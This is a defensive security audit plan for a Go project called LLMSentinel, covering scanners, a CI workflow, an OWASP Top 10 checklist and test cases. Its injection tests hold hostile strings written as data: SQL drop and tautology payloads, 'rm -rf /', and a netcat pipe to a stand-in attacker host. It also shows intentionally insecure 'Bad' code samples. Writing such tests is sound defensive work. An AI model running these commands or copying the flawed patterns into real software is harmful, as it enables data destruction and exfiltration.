# Phase 3: Security Audit — Independent Review & Remediation

**Status**: Implementation Ready  
**Objective**: Identify and fix all security vulnerabilities  
**Exit Criteria**: Zero CRITICAL, <5 HIGH severity issues, clean dependency scan  
**Effort**: 2-3 weeks  
**Dependencies**: None (can run parallel to Phases 1-2)

---

## Audit Scope

### In Scope ✓
- OWASP Top 10 (2025) vulnerabilities
- Cryptographic validation (algorithms, key sizes, randomness)
- Input injection testing (SQL, command, JSON, NoSQL, template)
- Authentication & authorization (token management, privilege escalation)
- Data exposure (logs, error messages, side channels, secrets)
- Dependency vulnerabilities (transitive + direct)
- Secrets management (API keys, credentials in code/logs)
- Rate limiting bypass testing
- API endpoint security
- Database security (SQL injection, unauthorized access)

### Out of Scope ✗
- Performance optimization
- UX/design flaws
- Documentation accuracy
- Non-security code quality

---

## Audit Tools & Vendors

### Option A: Free/Low-Cost (Recommended for MVP)

#### 1. Snyk Community (Free)
```bash
# Install
npm install -g snyk

# Scan dependencies
snyk test --severity-threshold=high

# Monitor for new vulnerabilities
snyk monitor

# Scan for secrets
snyk test --detect-secrets
```
**Cost**: Free  
**Coverage**: Dependency vulnerabilities + secrets detection  
**Limitation**: Community tier, slower updates  

#### 2. gosec (Built-in Go Security)
```bash
# Install
go install github.com/securego/gosec/v2/cmd/gosec@latest

# Scan codebase
gosec ./...

# Generate report
gosec -fmt json -out report.json ./...
```
**Cost**: Free  
**Coverage**: Go-specific security patterns (unsafe functions, hardcoded secrets, SQL injection)  
**Limitation**: Limited to static analysis  

#### 3. Go Vulnerability Database
```bash
# Check dependencies against known CVEs
go list -json ./... | nancy sleuth

# Or use govulncheck
govulncheck ./...
```
**Cost**: Free  
**Coverage**: Known Go package vulnerabilities  

### Option B: Professional Services (For v1.0.0)

#### Snyk Professional
- **Cost**: $5K-15K depending on scope
- **Coverage**: Dependency + SAST + container scanning
- **Timeline**: 1-2 weeks
- **Report**: Detailed findings + remediation guidance

#### OWASP Foundation Partners
- **Cost**: $3K-8K
- **Coverage**: Manual penetration testing + code review
- **Timeline**: 2-3 weeks
- **Report**: Comprehensive security assessment

### Option C: Hybrid (Recommended)
1. **Snyk Community** (Free): Dependency scanning
2. **gosec** (Free): Go-specific patterns
3. **Manual code review** (Internal): Critical paths
4. **Fuzzing** (Free): Input validation

**Total Cost**: $0 + Internal expertise  
**Timeline**: 1-2 weeks  

---

## Automated Security Scanning

### Step 1: Set Up Snyk

```bash
# 1. Create free account at snyk.io
# 2. Connect GitHub repo
# 3. Enable automatic scanning on pull requests

# Local testing
npm install -g snyk
snyk test

# Output example:
# Tested 45 dependencies for known issues
# ✓ No vulnerabilities found
# 
# Tested 0 policies
# No policy violations found
```

### Step 2: Enable gosec in CI/CD

Create `.github/workflows/security-scan.yml`:

```yaml
name: Security Scan

on:
  push:
    branches: [main, develop]
  pull_request:
  schedule:
    - cron: '0 2 * * *'  # Daily at 2 AM UTC

jobs:
  gosec:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run gosec
        uses: securego/gosec@master
        with:
          args: '-fmt json -out gosec-report.json ./...'
      
      - name: Upload gosec report
        uses: actions/upload-artifact@v3
        with:
          name: gosec-report
          path: gosec-report.json

  snyk:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      
      - name: Run Snyk scan
        uses: snyk/actions/golang@master
        env:
          SNYK_TOKEN: ${{ secrets.SNYK_TOKEN }}
      
      - name: Upload Snyk report
        uses: actions/upload-artifact@v3
        if: always()
        with:
          name: snyk-report
          path: snyk-results.json

  govulncheck:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version: '1.26'
      
      - name: Run govulncheck
        run: |
          go install golang.org/x/vuln/cmd/govulncheck@latest
          govulncheck ./...
```

### Step 3: Configure Snyk for Continuous Monitoring

```bash
# Authenticate with GitHub
snyk auth

# Import repository
snyk monitor --remote-repo-url=https://github.com/szibis/LLMSentinel

# Enable PR checks
# (via snyk.io dashboard: Settings → Integrations → GitHub)

# Create Snyk policy file
cat > .snyk <<EOF
# Snyk policy file
version: v1.25.0

# Ignore known false positives
ignore:
  # Example: if a vulnerability has been reviewed and deemed acceptable
  # SNYK-JS-LODASH-123456:
  #   - '*':
  #       reason: 'Reviewed and mitigated'
  #       expires: 2026-12-31

# Patch rules for automatic fixes
patch:
  SNYK-GOLANG-GOMOD-123456:
    patched: '2026-04-30'

# Require fix for severity
require-patch: 'high'
EOF

git add .snyk
git commit -m "chore: add Snyk policy"
```

---

## Manual Security Review Checklist

### 1. OWASP Top 10 (2025)

#### A01: Broken Access Control
**Check**:
- [ ] Authentication required for sensitive endpoints
- [ ] Authorization checks before data access
- [ ] No privilege escalation via parameter manipulation
- [ ] API keys validated on every request
- [ ] Rate limiting prevents enumeration attacks

**Code Review**:
```go
// ✓ Good: Check authorization before action
func DeleteUser(userID string, requester User) error {
    if requester.ID != userID && !requester.IsAdmin {
        return ErrUnauthorized
    }
    // Delete user...
}

// ✗ Bad: No authorization check
func DeleteUser(userID string) error {
    // Delete any user
    db.Delete("users", userID)
}
```

#### A02: Cryptographic Failures
**Check**:
- [ ] Sensitive data encrypted at rest (AES-256)
- [ ] Sensitive data encrypted in transit (TLS 1.2+)
- [ ] Cryptographic keys not hardcoded
- [ ] Random number generation uses crypto/rand
- [ ] No weak hash algorithms (MD5, SHA1)

**Code Review**:
```go
// ✓ Good: Using secure random
import "crypto/rand"
func GenerateToken() string {
    b := make([]byte, 32)
    rand.Read(b)
    return hex.EncodeToString(b)
}

// ✗ Bad: Using math/rand (not cryptographically secure)
import "math/rand"
func GenerateToken() string {
    b := make([]byte, 32)
    for i := range b {
        b[i] = byte(rand.Intn(256))
    }
    return hex.EncodeToString(b)
}
```

#### A03: Injection
**Check**:
- [ ] SQL queries use parameterized statements
- [ ] Command execution validated/escaped
- [ ] JSON/XML parsing uses safe libraries
- [ ] Template injection prevention
- [ ] NoSQL queries parameterized

**Test Cases**:
```go
func TestSQLInjectionPrevention(t *testing.T) {
    // Attempt SQL injection
    maliciousInput := "'; DROP TABLE users--"
    
    // Should be parameterized
    query := "SELECT * FROM users WHERE id = ?"
    rows, err := db.Query(query, maliciousInput)
    
    assert.NoError(t, err)
    // Query should treat input as data, not code
}

func TestCommandInjectionPrevention(t *testing.T) {
    // Attempt command injection
    maliciousInput := "file.txt; rm -rf /"
    
    // Should be escaped/validated
    cmd := exec.Command("cat", maliciousInput)
    output, err := cmd.Output()
    
    assert.NoError(t, err)
    // Should read literal file, not execute rm
}
```

#### A04: Insecure Design
**Check**:
- [ ] Input validation at all boundaries
- [ ] No trust in client-side validation
- [ ] Business logic threats considered
- [ ] Rate limiting in place
- [ ] Resource exhaustion prevented

#### A05: Security Misconfiguration
**Check**:
- [ ] Default credentials removed
- [ ] Unnecessary ports/services disabled
- [ ] Security headers set (HSTS, CSP, X-Frame-Options)
- [ ] Debug mode disabled in production
- [ ] Error messages don't leak system details

```go
// ✓ Good: Doesn't leak internal details
func (s *Service) HandleError(w http.ResponseWriter, err error) {
    log.Errorf("internal error: %v", err)  // Log details
    http.Error(w, "Internal Server Error", 500)  // Generic response
}

// ✗ Bad: Leaks stack trace and file paths
func (s *Service) HandleError(w http.ResponseWriter, err error) {
    http.Error(w, fmt.Sprintf("Error: %v\nStack: %s", err, debug.Stack()), 500)
}
```

#### A06: Vulnerable/Outdated Components
**Check**:
- [ ] All dependencies have known CVEs
- [ ] No deprecated packages used
- [ ] Regular updates applied
- [ ] Transitive dependencies checked

```bash
# Check for vulnerabilities
go list -json ./... | nancy sleuth
govulncheck ./...
```

#### A07: Authentication Failures
**Check**:
- [ ] Passwords never logged
- [ ] Session tokens generated securely
- [ ] Token expiration enforced
- [ ] Multi-factor authentication support (if needed)
- [ ] Brute force protection

#### A08: Software and Data Integrity Failures
**Check**:
- [ ] Code reviewed before merge
- [ ] Dependencies verified (go.mod checksums)
- [ ] Build artifacts signed
- [ ] No hardcoded secrets

#### A09: Logging and Monitoring Failures
**Check**:
- [ ] Security events logged
- [ ] Logs not accessible to unauthorized users
- [ ] PII not logged
- [ ] Log retention policy
- [ ] Real-time alerting for suspicious activity

```go
// ✓ Good: Log security events, not sensitive data
func (s *Service) AuthenticateUser(username, password string) (User, error) {
    user, err := s.db.GetUser(username)
    if err != nil || !s.verifyPassword(password, user.PasswordHash) {
        log.Warnf("failed login attempt for user: %s", username)  // No password
        return nil, ErrInvalidCredentials
    }
    log.Infof("successful login for user: %s", username)
    return user, nil
}

// ✗ Bad: Logs password and request details
func (s *Service) AuthenticateUser(username, password string) (User, error) {
    log.Infof("login attempt: username=%s password=%s", username, password)
    // ... authentication logic ...
}
```

#### A10: Server-Side Request Forgery (SSRF)
**Check**:
- [ ] Only connect to whitelisted hosts
- [ ] Validate URLs before fetching
- [ ] Block internal IP addresses
- [ ] Prevent DNS rebinding

```go
// ✓ Good: Validates URL before fetching
func (s *Service) FetchURL(urlStr string) ([]byte, error) {
    u, err := url.Parse(urlStr)
    if err != nil {
        return nil, err
    }
    
    // Block internal IPs
    if isInternalIP(u.Hostname()) {
        return nil, ErrInternalIPBlocked
    }
    
    // Block uncommon ports
    if !isAllowedPort(u.Port()) {
        return nil, ErrPortNotAllowed
    }
    
    resp, err := http.Get(urlStr)
    // ... handle response ...
}

// ✗ Bad: No validation
func (s *Service) FetchURL(urlStr string) ([]byte, error) {
    resp, _ := http.Get(urlStr)
    return ioutil.ReadAll(resp.Body)
}
```

---

### 2. Secrets Management

#### Check for Hardcoded Secrets

```bash
# Using git-secrets
git clone https://github.com/awslabs/git-secrets.git
cd git-secrets
make install

# Add patterns for your secrets
git secrets --add 'ANTHROPIC_API_KEY'
git secrets --add 'sk-ant-[A-Za-z0-9-]*'
git secrets --add 'password.*=.*'

# Scan entire repo
git secrets --scan

# Scan all history
git secrets --scan -r HEAD
```

#### Scan for Secrets with gosec

```bash
gosec ./... -fmt json | grep -i "secret\|hardcoded\|api"
```

#### Secrets Policy

```
✓ Allowed:
- API keys in environment variables only
- Secrets in .env (gitignored)
- Secrets in CI/CD secrets storage

✗ Not Allowed:
- Hardcoded secrets in code
- Secrets in logs/error messages
- Secrets in comments
- Secrets in git history
```

---

### 3. API Security

#### Authentication
- [ ] All endpoints require valid token
- [ ] Token format: JWT with signature
- [ ] Token expiration: 1 hour or less
- [ ] Refresh token: 7 days, single-use

#### Authorization
- [ ] Role-based access control (RBAC)
- [ ] Resource-level permissions checked
- [ ] No privilege escalation paths

#### Rate Limiting
- [ ] Global rate limit: 1000 req/s
- [ ] Per-user limit: 100 req/s
- [ ] Per-IP limit: 10000 req/s
- [ ] Correct 429 response with Retry-After

#### Input Validation
- [ ] All inputs validated at API boundary
- [ ] Max payload size enforced
- [ ] Timeout on long operations

---

## Security Test Cases

### Injection Testing

```go
func TestSQLInjection(t *testing.T) {
    tests := []string{
        "'; DROP TABLE users--",
        "1' OR '1'='1",
        "admin' --",
        "1; DELETE FROM users",
    }
    
    for _, malicious := range tests {
        user, err := db.GetUserByID(malicious)
        // Should not execute malicious SQL
        assert.Error(t, err) // Should fail validation
    }
}

func TestCommandInjection(t *testing.T) {
    tests := []string{
        "file.txt; rm -rf /",
        "file.txt && malicious_command",
        "file.txt | nc attacker.com 1234",
    }
    
    for _, malicious := range tests {
        content, err := readFile(malicious)
        // Should not execute commands
        assert.Error(t, err) // Should fail validation
    }
}
```

### Rate Limiting Testing

```go
func TestRateLimiting(t *testing.T) {
    // Make 1001 requests rapidly
    for i := 0; i < 1001; i++ {
        resp, _ := http.Get("http://localhost:9000/api/health")
        
        if i <= 1000 {
            assert.Equal(t, 200, resp.StatusCode)
        } else {
            assert.Equal(t, 429, resp.StatusCode) // Too Many Requests
        }
    }
}
```

### Authentication Testing

```go
func TestUnauthorizedAccess(t *testing.T) {
    // Try without token
    req, _ := http.NewRequest("GET", "http://localhost:9000/api/sensitive", nil)
    resp, _ := http.DefaultClient.Do(req)
    assert.Equal(t, 401, resp.StatusCode)
    
    // Try with invalid token
    req.Header.Set("Authorization", "Bearer invalid_token")
    resp, _ = http.DefaultClient.Do(req)
    assert.Equal(t, 401, resp.StatusCode)
}
```

---

## Finding Severity Levels

### CRITICAL (Fix immediately, blocks release)
- Remote code execution
- SQL injection
- Authentication bypass
- Hardcoded secrets
- Unencrypted sensitive data

### HIGH (Fix before RC1)
- Privilege escalation
- Denial of service vector
- Weak cryptography
- Missing authorization check
- Log injection

### MEDIUM (Fix before v1.0.0)
- Missing rate limiting
- Verbose error messages
- Weak input validation
- Missing security headers
- Outdated dependency with CVSS <7.0

### LOW (Nice to have)
- Code quality
- Documentation
- Non-critical features
- Minor dependency updates

---

## Remediation Workflow

### Step 1: Triage
1. Run all security scanners (Snyk, gosec, govulncheck)
2. Categorize findings (CRITICAL → LOW)
3. Create issue for each finding

### Step 2: Remediate
```markdown
# Security Issue: SQL Injection in User Lookup

**Severity**: CRITICAL  
**Scanner**: gosec  
**File**: internal/database/user.go:45  

## Finding
```go
query := "SELECT * FROM users WHERE id = " + userID
```

## Remediation
Use parameterized query:
```go
query := "SELECT * FROM users WHERE id = ?"
row := db.QueryRow(query, userID)
```

## Verification
- [ ] Code reviewed
- [ ] Test case added (TestSQLInjection)
- [ ] gosec passes
- [ ] All tests pass
```

### Step 3: Verify & Document

```bash
# After fix:
gosec ./...          # No new findings
govulncheck ./...    # No vulnerabilities
snyk test            # No issues

# Document in SECURITY_AUDIT_REPORT.md
```

---

## Deliverables

### 1. SECURITY_AUDIT_REPORT.md
```markdown
# Security Audit Report — LLMSentinel v1.0.0

**Date**: April 30, 2026  
**Auditors**: Internal team + Snyk  
**Status**: PASS ✓

## Summary
- CRITICAL: 0 ✓
- HIGH: 2 (both remediated)
- MEDIUM: 3 (all remediated)
- LOW: 5 (4 remediated, 1 deferred)

## Detailed Findings
[List all findings with remediation status]

## Verification
- gosec: PASS
- snyk test: PASS
- govulncheck: PASS
- Manual review: PASS

## Sign-Off
Auditors: [names]
Date: [date]
```

### 2. Security Improvements Checklist
```markdown
- [x] All injection types tested
- [x] Cryptography validated
- [x] Secrets removed from codebase
- [x] Rate limiting verified
- [x] Error messages sanitized
- [x] Dependencies updated
- [x] Security headers added
- [x] Logging doesn't leak PII
```

### 3. CI/CD Security Integration
- Snyk scanning on every PR
- gosec on every push
- govulncheck on every release
- Artifact signing

---

## Timeline

| Phase | Week | Tasks |
|-------|------|-------|
| **Setup** | Week 1 | Install tools, run initial scans |
| **Manual Review** | Week 1-2 | OWASP Top 10 code review |
| **Remediation** | Week 2-3 | Fix findings, test fixes |
| **Verification** | Week 3 | All scanners pass, audit report ready |

**Critical Path**: ~10 business days

---

## Exit Criteria ✓

- [ ] Snyk: Zero high-risk vulnerabilities
- [ ] gosec: Zero CRITICAL findings
- [ ] govulncheck: Zero known vulnerabilities
- [ ] Manual code review: Documented and approved
- [ ] All CRITICAL findings remediated
- [ ] All HIGH findings remediated with evidence
- [ ] Security audit report completed and signed off
- [ ] CI/CD security scanning enabled

---

## Success Indicators

✅ Zero CRITICAL vulnerabilities  
✅ <5 HIGH severity issues (all with mitigation)  
✅ Clean dependency scan  
✅ All OWASP Top 10 categories reviewed  
✅ Security audit report filed  
✅ Team trained on security issues found  
✅ Security practices documented  

---

## Related Documents

- [OWASP Top 10 2025](https://owasp.org/www-project-top-ten/)
- [Go Security](https://golang.org/doc/security)
- [Snyk Documentation](https://docs.snyk.io/)
- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
